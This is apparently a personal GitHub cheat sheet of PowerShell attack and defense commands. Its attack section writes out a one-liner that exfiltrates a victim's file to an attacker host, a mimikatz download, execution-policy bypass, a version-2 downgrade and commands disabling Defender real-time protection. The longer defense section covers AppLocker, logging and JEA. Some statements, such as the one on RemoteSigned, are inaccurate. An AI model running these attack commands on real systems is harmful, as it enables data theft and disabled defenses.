# PowerShell Commands

Personal sheet for PowerShell 🧢

TO BE CONTINUED indefinitely...

![GitHub last commit](https://img.shields.io/github/last-commit/jmau111-org/powershell_commands?label=last%20update%3A)

## Attacking techniques: practical examples

### HTTP requests

#### Exfiltrate data

```powershell
PowerShell.exe -ex bypass -noprofile -c Invoke-WebRequest -uri https://{ATTACKER_IP_SERVER} -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\Users\Victim\path\to\data.xml')))
```

#### Download attacking tools

```powershell
PowerShell.exe -ex bypass -noprofile -c Invoke-WebRequest -Method GET -uri https://{ATTACKER_IP_SERVER}/exec/mimikatz.exe -OutFile "c:\Users\Victim\mimi.exe"
```

### Bypass Execution policy

```powershell
PowerShell.exe -noprofile -executionpolicy bypass -file .\malicious.ps1
```

or:

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
```

Setting the execution policy to `RemoteSigned` only allows running unsigned scripts.

### Exploit debugging variables

```
__PSLockdownPolicy
```

If this env var is set on production, there's a chance admins think it's a safety measure.

### Place a downgrade attack

```powershell
PowerShell.exe -Version 2
```

Older versions of PS have less security features according to the [unicorn](https://github.com/trustedsec/unicorn).

### Run PowerShell commands without PowerShell.exe

You can use [p0wnedShell](https://github.com/Cn33liz/p0wnedShell)

### Disable critical protections

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

### Attack RDP connections

If admins use misconfigured RDP (remote desktop protocol) for remoting, it can be Brute-Forced to pass malicious cmdlets.

## Defense

### Limit unconstrained code execution

```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

Default since PowerShell v5 if you use AppLocker.

### Use Applocker

#### Overview

[Overview by Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)

#### cmdlets for AppLocker

##### Get the current AppLocker configuration

```powershell
Get-AppLockerPolicy -Effective
```

#### Create an AppLocker policy

```powershell
New-AppLockerPolicy
```

#### Test an exec against the AppLocker policy

```powershell
Test-AppLockerPolicy -Path <path_to_exec>
```

### Add GPOs (Group policies)

#### Enable Module and Script block logging

Go to Windows Configuration > Policies > Administrative Settings > Windows Components > Windows PowerShell

* Turn on Module Logging
* Turn on PowerShell Script Block Logging

or with PowerShell:

```powershell
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"  -Name EnableModuleLogging -Value "1"
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockInvocationLogging -Value "1"
```

Then, it's possible to connect logs to a SIEM or a similar software.

#### Enable transcripting

GPO or:

```powershell
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value "1"
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableInvocationHeader" -Value "1"
```

#### Enable Protected Event Logging

Go to Windows Components -> Administrative Templates -> Event Logging: "Enable Protected Event Logging." You 'll have to provide a valid certificate.

or:

```powershell
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name "EnableProtectedEventLogging" -Value "1"
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name "EncryptionCertificate" -Value $Certificate
```

Where `$Certificate` is your certificate.

### Set Execution policy

```powershell
Get-ExecutionPolicy
Set-executionpolicy restricted
```

`restricted` should be default, but check it.

### Anti-Downgrade

```powershell
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

More advanced tricks [there](https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/)

### Challenges for attackers

Some attacks attempt to modify settings and disable some protections. There are important inconveniences for attackers, though:

* most commands require an elevated shell
* notifications are sent by default
* Windows events are triggered by default

### Suspicious Cmdlets

Many legitimate commands like `Invoke-WebRequest` can be exploited by attackers, but some cmdlets look more suspicious than others. Here are a few examples:

* `Invoke-Mimikatz`
* `Invoke-ShellCode`
* `Get-FileHash`
* `Invoke-DllInjection`
* `Get-Hotfix | measure`

It often means attackers used a known tool (e.g, PowerSploit, Mimikatz, Powercat) or performed advanced enumeration.

### Enable JEA

JEA (Just Enough Administration) allows more control over PowerShell, especially if you need more granularity on cmdlets and security for remoting.

[Source: Microsoft JEA](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.3)

### Misc: other helpful commands

#### Get list of installed software

```powershell
Get-WmiObject Win32_Product | Select-Object Name
```

#### Get list of running processes

```powershell
Get-Process
```

#### Get network connections

```powershell
Get-NetTCPConnection
```

#### Get active firewall rules

```powershell
Get-NetFirewallRule
```

#### Get list of scheduled tasks

```powershell
Get-ScheduledTask
```

#### Get event logs

```powershell
Get-EventLog -LogName Security
```

#### Search for specific event logs

```powershell
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq <event_id>}
```

#### Get list of local user accounts

```powershell
Get-LocalUser
```

#### Get list of local group accounts

```powershell
Get-LocalGroup
```

#### Get list of environment variables

```powershell
Get-ChildItem Env:
```

#### Get list of services

```powershell
Get-Service
```

#### Start a service

```powershell
Start-Service -Name <service>
```

#### Stop a service

```powershell
Stop-Service <service>
```

#### Stop a running process

```powershell
Stop-Process -Name <process>
```

#### Remove a scheduled task

```powershell
Unregister-ScheduledTask -TaskName <task>
```

#### Disable a firewall rule

```powershell
Disable-NetFirewallRule -DisplayName <rule>
```
